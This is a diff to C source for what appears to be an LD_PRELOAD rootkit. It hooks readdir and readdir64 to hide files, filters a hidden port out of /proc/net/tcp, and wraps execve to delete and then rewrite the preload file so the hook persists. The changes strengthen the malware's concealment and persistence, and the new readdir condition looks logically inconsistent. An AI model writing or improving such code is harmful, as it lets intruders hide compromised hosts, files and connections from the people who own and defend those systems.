@@ -80,6 +80,7 @@ void hijack_proc_net_tcp(FILE* tmp, const char *path, const char* mode) {
             if(strstr(buff, HEX_PORT) == NULL)
                 fputs(buff, tmp);
         }
+        fflush(old_file);
         fclose(old_file);
         free(buff);
         buff = NULL;
@@ -93,7 +94,9 @@ struct dirent* readdir(DIR *dir) {
 
     if(old_readdir == NULL) old_readdir = dlsym(RTLD_NEXT, "readdir");
     while((dir_ = old_readdir(dir))) {
-        if(strstr(dir_->d_name, MAGIC_STRING) == NULL) break;
+        if(strstr(dir_->d_name, MAGIC_STRING) == NULL
+        || strstr(dir_->d_name, PRELOAD_FILE) == NULL)
+            break;
     }
     return dir_;
 }
@@ -104,7 +107,9 @@ struct dirent64* readdir64(DIR *dir) {
 
     if(old_readdir64 == NULL) old_readdir64 = dlsym(RTLD_NEXT, "readdir64");
     while((dir_ = old_readdir64(dir))) {
-        if(strstr(dir_->d_name, MAGIC_STRING) == NULL) break;
+        if(strstr(dir_->d_name, MAGIC_STRING) == NULL
+        || strstr(dir_->d_name, PRELOAD_FILE) == NULL)
+            break;
     }
     return dir_;
 }
@@ -163,10 +168,14 @@ int execve(const char *path, char *const argv[], char *const envp[]) {
 
     if(strstr(path, LD_LIBRARY) != NULL) {
         if(old_unlink == NULL) old_unlink = dlsym(RTLD_NEXT, "unlink");
-        
+        if(old_fopen == NULL) old_fopen = dlsym(RTLD_NEXT, "fopen");
+        FILE *ld_preload;        
+
         old_unlink(PRELOAD_PATH);
         old_execve(path, argv, envp);
-        link(PRELOAD_PATH, PRELOAD_PATH);
+        ld_preload = old_fopen(PRELOAD_PATH, "w");
+        fwrite(MAGIC_PATH, strlen(MAGIC_PATH), 1, ld_preload);
+        fclose(ld_preload);
 
         return 0;
     }
